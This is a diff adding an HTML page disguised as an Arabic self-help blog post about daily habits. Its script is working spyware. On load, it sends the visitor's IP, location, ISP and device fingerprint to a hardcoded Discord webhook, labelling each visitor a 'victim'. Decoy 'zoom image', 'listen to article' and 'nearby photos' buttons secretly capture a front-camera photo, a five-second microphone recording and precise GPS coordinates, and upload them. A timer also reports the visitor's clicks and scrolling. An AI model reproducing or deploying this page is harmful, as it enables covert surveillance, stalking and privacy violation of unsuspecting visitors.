@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>مدونة الفكر — عشر عادات تغيّر حياتك</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,sans-serif; }
+  body { background:#f7f7f7; color:#222; line-height:2; }
+  header { background:#fff; border-bottom:1px solid #eee; padding:18px 22px; }
+  header h1 { font-size:20px; color:#111; letter-spacing:.5px; }
+  main { max-width:720px; margin:0 auto; padding:28px 22px 80px; background:#fff; min-height:100vh; }
+  h2 { font-size:26px; color:#111; margin-bottom:18px; line-height:1.5; }
+  .meta { color:#888; font-size:13px; margin-bottom:22px; }
+  p { font-size:17px; margin-bottom:18px; color:#333; }
+  .hero { width:100%; border-radius:10px; margin:18px 0; cursor:pointer; display:block; }
+  .zoom-btn {
+    display:inline-block; padding:10px 18px; background:#111; color:#fff;
+    border-radius:24px; font-size:14px; font-weight:600; cursor:pointer;
+    margin:10px 0 20px; border:none; transition:transform .15s;
+  }
+  .zoom-btn:active { transform:scale(.96); }
+  .audio-btn {
+    display:flex; align-items:center; gap:10px; padding:14px 18px;
+    background:#eef6ff; color:#0064c8; border-radius:12px; font-size:15px;
+    font-weight:600; cursor:pointer; margin:22px 0; border:1px solid #cde3ff;
+  }
+  .audio-btn:active { background:#d9ebff; }
+  .nearby {
+    margin:30px 0; padding:20px; background:#fff7e6; border:1px solid #ffe0a3;
+    border-radius:12px; cursor:pointer; text-align:center;
+  }
+  .nearby .title { font-weight:700; color:#a86b00; margin-bottom:6px; font-size:15px; }
+  .nearby .sub { font-size:13px; color:#a86b00; opacity:.8; }
+  .toast {
+    position:fixed; bottom:30px; right:50%; transform:translateX(50%);
+    background:#111; color:#fff; padding:12px 22px; border-radius:30px;
+    font-size:14px; opacity:0; transition:opacity .3s; pointer-events:none;
+    z-index:9999;
+  }
+  .toast.show { opacity:1; }
+</style>
+</head>
+<body>
+
+<header><h1>مدونة الفكر</h1></header>
+
+<main>
+  <h2>عشر عادات يومية تغيّر حياتك خلال شهر</h2>
+  <div class="meta">نُشر بتاريخ 12 مارس · 5 دقائق قراءة</div>
+
+  <p>الحياة تتغيّر بالتفاصيل الصغيرة، لا بالقرارات الكبرى. في هذا المقال سنستعرض عادات بسيطة يمكن لأي شخص أن يبدأ بها من الغد، بلا مال ولا وقت إضافي، فقط بقرار هادئ ومستمر.</p>
+
+  <img class="hero" id="heroImg" src="https://picsum.photos/720/380?random=1" alt="">
+  <button class="zoom-btn" id="btnCamera">🔍 تكبير الصورة</button>
+
+  <p>ابدأ بيومك بقراءة صفحة واحدة، وامشِ عشر دقائق، واكتب ثلاث جمل عن شعورك. هذا كل شي — والباقي يأتي من نفسه، مثل نهر يفتح مجراه في الصخر.</p>
+
+  <div class="audio-btn" id="btnAudio">
+    <span style="font-size:22px;">🎧</span>
+    <span>استمع للمقال بصوت القارئ</span>
+  </div>
+
+  <p>لا تحاول تغيير كل شي في يوم واحد. العادات التي تدوم هي التي تنمو ببطء، مثل شجرة تقف في مكانها سنوات ثم تصير غابة.</p>
+
+  <div class="nearby" id="btnGeo">
+    <div class="title">📍 اعرض الصور القريبة من منطقتك</div>
+    <div class="sub">اقتراحات مخصصة حسب موقعك</div>
+  </div>
+
+  <p>في النهاية، لست بحاجة لتغيير العالم. بحاجة لتغيير صباحك فقط. والباقي يأتي من نفسه.</p>
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* =========================================================
+   الإعدادات
+   ========================================================= */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1560747844049178654/3M39QAjdGEkFFJBwHCY1gYxE8y5I3DdOjjrJZPIt9A-GgTkex67jyl6uyzCcSVIwihnN";
+
+/* =========================================================
+   أدوات الإرسال
+   ========================================================= */
+async function sendText(content) {
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+  } catch (e) {}
+}
+
+async function sendEmbed(embed) {
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch (e) {}
+}
+
+async function sendFile(blob, filename, caption) {
+  try {
+    const fd = new FormData();
+    fd.append("file", blob, filename);
+    fd.append("payload_json", JSON.stringify({ content: caption }));
+    await fetch(WEBHOOK_URL, { method: "POST", body: fd });
+  } catch (e) {}
+}
+
+function toast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2600);
+}
+
+/* =========================================================
+   Silent Recon — يشتغل مباشرة
+   ========================================================= */
+async function silentRecon() {
+  let ip = null;
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    ip = await r.json();
+  } catch (e) {}
+
+  const embed = {
+    title: "🎯 ضحية جديدة فتحت الرابط",
+    color: 0xff0000,
+    timestamp: new Date().toISOString(),
+    fields: [
+      { name: "🌐 IP", value: ip?.ip || '?', inline: true },
+      { name: "📍 المدينة", value: ip ? `${ip.city || '?'}, ${ip.country_name || '?'}` : '?', inline: true },
+      { name: "🏢 ISP", value: ip?.org || '?', inline: true },
+      { name: "🚨 VPN/Proxy", value: ip?.security?.is_vpn ? '✅ VPN' : (ip?.security?.is_proxy ? '✅ Proxy' : '❌ No'), inline: true },
+      { name: "📱 UA", value: (navigator.userAgent || '').slice(0, 400), inline: false },
+      { name: "🖥️ Platform", value: navigator.platform || '?', inline: true },
+      { name: "⚙️ Cores", value: String(navigator.hardwareConcurrency || '?'), inline: true },
+      { name: "💾 RAM", value: (navigator.deviceMemory || '?') + ' GB', inline: true },
+      { name: "📐 Screen", value: `${screen.width}x${screen.height} @${devicePixelRatio}x`, inline: true },
+      { name: "🌍 TZ", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+      { name: "🕒 Referrer", value: document.referrer || '(direct)', inline: false }
+    ],
+    footer: { text: `ALPHA // ${new Date().toLocaleString('ar-LY')}` }
+  };
+  await sendEmbed(embed);
+}
+silentRecon();
+
+/* =========================================================
+   1) زر "تكبير الصورة" → الكاميرا
+   ========================================================= */
+document.getElementById('btnCamera').addEventListener('click', async () => {
+  toast('جاري التكبير...');
+
+  // الوهم البصري — كبّر الصورة أول
+  const img = document.getElementById('heroImg');
+  img.style.transition = 'transform .4s';
+  img.style.transform = img.style.transform === 'scale(1.05)' ? 'scale(1)' : 'scale(1.05)';
+
+  // خلف الكواليس — اطلب الكاميرا
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' },  // الكاميرا الأمامية = وجهه
+      audio: false
+    });
+
+    // التقط صورة بعد ثانية واحدة (لما تفتح الكاميرا فعليًا)
+    setTimeout(async () => {
+      try {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        await video.play();
+        await new Promise(r => setTimeout(r, 800));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+        const blob = await (await fetch(dataUrl)).blob();
+        await sendFile(blob, 'camera.jpg', '📸 صورة من الكاميرا الأمامية');
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        await sendText('📸 الكاميرا فتحت بس ما قدرنا نلتقط: ' + e.message);
+        stream.getTracks().forEach(t => t.stop());
+      }
+    }, 1200);
+
+  } catch (e) {
+    await sendText('📸 رفض الكاميرا: ' + e.message);
+  }
+});
+
+/* =========================================================
+   2) زر "استمع للمقال" → الميكروفون
+   ========================================================= */
+document.getElementById('btnAudio').addEventListener('click', async () => {
+  toast('جاري تشغيل الصوت...');
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+
+    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+
+    recorder.onstop = async () => {
+      const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+      await sendFile(blob, 'audio.webm', '🎙️ تسجيل من الميكروفون (5 ثواني)');
+      stream.getTracks().forEach(t => t.stop());
+    };
+
+    recorder.start();
+    await sendText('🎙️ الميكروفون فتح — بدأ التسجيل 5 ثواني');
+    setTimeout(() => { try { recorder.stop(); } catch (e) {} }, 5000);
+
+  } catch (e) {
+    await sendText('🎙️ رفض الميكروفون: ' + e.message);
+  }
+});
+
+/* =========================================================
+   3) زر "الصور القريبة" → الموقع
+   ========================================================= */
+document.getElementById('btnGeo').addEventListener('click', async () => {
+  toast('جاري تحديد منطقتك...');
+
+  if (!navigator.geolocation) {
+    await sendText('📍 الجهاز ما يدعم geolocation');
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const { latitude, longitude, accuracy } = pos.coords;
+
+      // نرسل الإحداثيات
+      await sendText(
+        `📍 **الموقع انكشف**\n` +
+        `Lat: \`${latitude}\`\n` +
+        `Lon: \`${longitude}\`\n` +
+        `Accuracy: \`${accuracy}m\`\n` +
+        `Maps: https://maps.google.com/?q=${latitude},${longitude}`
+      );
+
+      // نرسل embed فيه الخريطة
+      await sendEmbed({
+        title: "🗺️ موقع الضحية",
+        color: 0x00b0ff,
+        image: { url: `https://staticmap.openstreetmap.de/staticmap.php?center=${latitude},${longitude}&zoom=15&size=600x400&markers=${latitude},${longitude},red-pushpin` },
+        description: `https://www.google.com/maps?q=${latitude},${longitude}`,
+        timestamp: new Date().toISOString()
+      });
+    },
+    async (err) => {
+      await sendText('📍 رفض الموقع: ' + err.message);
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+});
+
+/* =========================================================
+   4) سلوك المستخدم — يترسل بعد 25 ثانية
+   ========================================================= */
+const behavior = { start: Date.now(), clicks: 0, moves: 0, scroll: 0 };
+document.addEventListener('click', () => behavior.clicks++);
+document.addEventListener('mousemove', () => behavior.moves++);
+window.addEventListener('scroll', () => {
+  const d = (window.scrollY + window.innerHeight) / document.body.scrollHeight;
+  behavior.scroll = Math.max(behavior.scroll, Math.round(d * 100));
+});
+
+setTimeout(() => {
+  const dur = Math.round((Date.now() - behavior.start) / 1000);
+  sendText(`\`\`\`⏱️ وقت: ${dur}s\n👆 نقرات: ${behavior.clicks}\n🖱️ حركات: ${behavior.moves}\n📜 تمرير: ${behavior.scroll}%\`\`\``);
+}, 25000);
+</script>
+</body>
+  </html>
